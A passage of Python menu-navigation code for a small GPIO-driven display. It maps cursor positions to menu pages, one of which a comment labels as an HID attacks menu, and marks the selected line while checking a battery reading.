                cursor = 1
            if cursor == 3:
                # hid attacks menu
                page = 14
                cursor = 1
            if cursor == 4:
                page = 21
                cursor = 1
            if cursor == 5:
                page = 28
                cursor = 1
            if cursor == 6:
                page = 35
                cursor = 1
            if cursor == 7:
                page = 42
                cursor = 1
            print(page + cursor)
    item[1] = switchMenu(page)
    item[2] = switchMenu(page + 1)
    item[3] = switchMenu(page + 2)
    item[4] = switchMenu(page + 3)
    item[5] = switchMenu(page + 4)
    item[6] = switchMenu(page + 5)
    item[7] = switchMenu(page + 6)
    # add curser on front on current selected line
    for n in range(1, 8):
        if page + cursor == page + n:
            if page == 1:
                if readCapacity(bus) < 16:
                    item[n] = item[n].replace("_", "!")
                else:
                    item[n] = item[n].replace("_", ">")
            else:
                item[n] = item[n].replace("_", ">")
        else:
            item[n] = item[n].replace("_", " ")
    displayText(item[1], item[2], item[3], item[4], item[5], item[6], item[7])
    # print(page+cursor) #debug trace menu value
    time.sleep(0.1)
    selection = 0
GPIO.cleanup()
